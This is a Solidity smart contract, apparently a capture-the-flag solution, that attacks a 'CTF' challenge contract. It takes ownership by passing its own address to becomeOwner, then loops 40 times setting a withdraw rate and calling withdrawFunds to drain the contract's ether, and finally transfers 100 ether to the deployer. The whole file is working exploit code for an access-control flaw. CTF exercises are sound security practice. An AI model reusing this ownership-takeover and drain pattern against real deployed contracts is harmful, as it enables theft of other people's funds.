// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "./Challenge.sol";
import "./CTF.sol";

contract Attack {
    Challenge public challenge;
    CTF public ctf;
    address payable public owner;

    constructor(address challengeAddr) {
        challenge = Challenge(challengeAddr);
        ctf = CTF(challenge.ctf());
        owner = payable(msg.sender);
    }

    function run() external {
        // Become owner by calling with our address as input
        ctf.becomeOwner(uint256(uint160(address(this))));

        // Loop 40 times to drain the contract
        for (uint i = 0; i < 40; i++) {
            // Set withdraw rate to 250 (2.5%)
            ctf.changeWithdrawRate(250);
            // Withdraw funds
            ctf.withdrawFunds();
            // Send 100 ether back to owner when we have enough
        }
        owner.transfer(100 ether);
    }

    // Required to receive ETH
    receive() external payable {}
}
